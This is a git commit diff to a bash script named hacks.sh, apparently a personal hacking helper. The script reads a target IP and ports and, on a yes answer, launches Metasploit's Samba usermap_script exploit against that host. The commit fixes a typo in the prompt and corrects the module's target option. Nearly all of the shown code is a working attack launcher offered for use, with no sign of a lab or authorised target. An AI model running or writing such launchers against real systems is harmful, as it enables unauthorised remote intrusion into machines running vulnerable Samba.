686f0d863ea7fd3ab5f66d868c75af23844539b4
Admin <admin@Admins-MacBook-Air.local>
2023-12-27 16:58:03 -0800

    fixing typos and testing

--- bash/hacks.sh
+++ bash/hacks.sh
@@ -8,9 +8,9 @@ read lport
 echo "Enter Attack Port AKA RPORT: "
 read rport
     
-read -p "Do you want to run the Samba attac (y/n) " yn
+read -p "Do you want to run the Samba attack (y/n) " yn
     case $yn in
-        [Yy]* ) msfconsole -q -x "use exploit/multi/samba/usermap_script; set rhost $ip; set lport $lport; exploit;"; break;;
+        [Yy]* ) msfconsole -q -x "use exploit/multi/samba/usermap_script; set rhosts $ip; set lport $lport; exploit;"; break;;
 	[Nn]* ) break;;
         * ) echo "Please Enter Yes or No.";;
     esac
